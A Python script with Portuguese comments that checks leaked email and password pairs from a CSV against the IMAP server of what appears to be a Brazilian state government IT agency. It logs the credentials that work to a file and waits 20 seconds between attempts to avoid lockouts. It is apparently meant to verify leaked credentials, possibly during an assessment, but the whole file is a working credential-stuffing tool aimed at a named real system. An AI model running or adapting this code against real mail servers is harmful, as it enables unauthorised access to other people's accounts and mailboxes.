import imaplib
import ssl
import csv
import time

#Servidor IMAP
IMAP_SERVER = "mail.prodepa.pa.gov.br" 
IMAP_PORT = 993  # Porta padrão para IMAP com SSL

# Arquivo de entrada com as credenciais
INPUT_CSV_FILE = "/home/teste/Documentos/BBOT_implementation/scans_tratados/logins_prodepa.csv"

# Arquivos de saída para registrar os resultados
VALID_CREDS_FILE = "/home/teste/Documentos/BBOT_implementation/fp_logins_dataleak/credenciais_validas.txt"
INVALID_CREDS_FILE = "/home/teste/Documentos/BBOT_implementation/fp_logins_dataleak/credenciais_invalidas.txt"

# Atraso para evitar bloqueios de IP/conta.
DELAY_BETWEEN_ATTEMPTS = 20 # segundos

def verify_credential(email, password):
    """
    Tenta autenticar no servidor IMAP e retorna True para sucesso, False para falha.
    """
    try:
        # Usa um contexto SSL para uma conexão segura
        context = ssl.create_default_context()
        
        # Conecta ao servidor
        print(f"[*] Tentando conectar ao servidor {IMAP_SERVER}...")
        mail = imaplib.IMAP4_SSL(IMAP_SERVER, IMAP_PORT, ssl_context=context)
        
        # Tenta fazer o login
        print(f"[*] Verificando: {email}")
        mail.login(email, password)
        
        # Se o login funcionou, desconecte e retorne sucesso
        mail.logout()
        return True
        
    except imaplib.IMAP4.error as e:
        # Essa exceção geralmente significa "Authentication failed"
        print(f"    -> Falha de autenticação para {email}: {e}")
        return False
    except Exception as e:
        # Captura outras exceções (problemas de rede, etc.)
        print(f"    -> Ocorreu um erro inesperado para {email}: {e}")
        return False

def main():
    """
    Função principal que lê o CSV e processa cada credencial.
    """
    print("--- INICIANDO VERIFICAÇÃO DE CREDENCIAIS VAZADAS ---")
    print(f"[!] AVISO: Existe um atraso de {DELAY_BETWEEN_ATTEMPTS} segundos entre cada tentativa.")

    try:
        with open(INPUT_CSV_FILE, 'r', encoding='utf-8') as f:
            reader = csv.reader(f)
            for row in reader:
                if len(row) != 2:
                    print(f"    -> Linha ignorada (formato inválido): {row}")
                    continue
                
                email, password = row
                
                is_valid = verify_credential(email, password)
                
                if is_valid:
                    print(f"[+] SUCESSO! Credencial VÁLIDA encontrada: {email}")
                    with open(VALID_CREDS_FILE, 'a', encoding='utf-8') as valid_file:
                        valid_file.write(f"{email}:{password}\n")
                else:
                    print(f"[-] FALHA. Credencial INVÁLIDA ou bloqueada: {email}")
                    with open(INVALID_CREDS_FILE, 'a', encoding='utf-8') as invalid_file:
                        invalid_file.write(f"{email}:{password}\n")

                # Espera antes da próxima tentativa
                time.sleep(DELAY_BETWEEN_ATTEMPTS)

    except FileNotFoundError:
        print(f"[ERRO] O arquivo de entrada '{INPUT_CSV_FILE}' não foi encontrado.")
        print("Por favor, crie o arquivo com as credenciais no formato 'email,senha'.")
    
    print("\n--- VERIFICAÇÃO CONCLUÍDA ---")
    print(f"Resultados salvos em '{VALID_CREDS_FILE}' e '{INVALID_CREDS_FILE}'.")


if __name__ == "__main__":
    main()